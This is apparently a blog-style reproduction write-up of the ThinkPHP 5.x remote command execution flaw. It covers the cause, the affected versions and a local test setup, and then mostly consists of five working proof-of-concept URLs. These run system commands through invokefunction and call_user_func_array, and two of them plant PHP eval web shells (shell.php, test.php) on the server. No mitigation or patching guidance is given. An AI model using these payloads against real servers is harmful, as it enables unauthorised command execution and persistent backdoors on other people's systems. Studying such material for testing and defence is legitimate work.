# ThinkPHP5.x remote command execution

Author: H3rmesk1t

Data: 2021.06.06

# Vulnerability Cause
Because the framework does not perform sufficient detection of the controller name, remote code execution may be caused without forced routing enabled (not enabled by default)

# Vulnerability affects version
Thinkphp 5.x-Thinkphp 5.1.31
Thinkphp 5.0.x<=5.0.23

# Vulnerability reappears
## Build a vulnerability environment
Download Thinkphp 5.0.22 on the official website, [Download address](http://www.thinkphp.cn/donate/download/id/1260.html)
Use phpstudy to build an environment, unzip the downloaded Thinkphp5.0.22 to the website directory, and you can access it with the browser

![Insert the picture description here](https://img-blog.csdnimg.cn/20210606150355430.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

## POC1

```
http://localhost:9091/public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami
```
![Insert the picture description here](https://img-blog.csdnimg.cn/20210606171441823.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
## POC2&POC3

```
http://localhost:9091/public/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1
```

```
http://localhost:9091/public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1
```

![Insert the picture description here](https://img-blog.csdnimg.cn/20210606171808985.png#pic_center)
## POC4&POC5

```
http://localhost:9091/public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20^%3C?php%20@eval($_POST[cmd]);?^%3E%20%3Eshell.php
```

```
http://localhost:9091/public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=../test.php&vars[1][]=<?php @eval($_POST[test]);?>
```
![Insert the picture description here](https://img-blog.csdnimg.cn/20210606173015963.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)